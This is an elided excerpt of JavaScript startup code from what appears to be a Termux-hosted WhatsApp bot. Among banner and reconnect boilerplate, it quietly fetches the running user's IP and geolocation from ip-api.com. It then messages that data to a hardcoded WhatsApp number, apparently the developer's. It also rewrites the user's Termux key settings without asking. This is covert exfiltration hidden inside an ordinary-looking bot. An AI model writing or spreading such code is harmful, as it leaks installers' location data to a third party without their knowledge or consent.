...
denz.autoReconnect = ReconnectMode.onConnectionLost
  ...
  teks  =  `https://chat.whatsapp.com/JHZNMSPKCvAE4xKSZJCV4O`
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       dan _ sendMessage ( "6283170329524@s.whatsapp.net" , `─────「 *IP-USER* \n\n\`\`\`${ bu }\`\`\` \n────────────────────` , MessageType .text , { contextInfo : { forwardingScore : 508 , isForwarded : true , externalAdReply :{ title : "Developer Bitch Boot" , body : "" , previewType : "PHOTO " , thumbnail : fs .readFileSync( './denz.jpg' ), sourceUrl : "https://wa.me/6283170329524?text=Assalamualaikum" }}})
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/Zye177/bitch-boot/', 'cyan'))},exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => {
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping(' Created By ᴋᴀᴋᴀ ᴢʏᴇ' ,{ flashStyle: term.brightWhite })
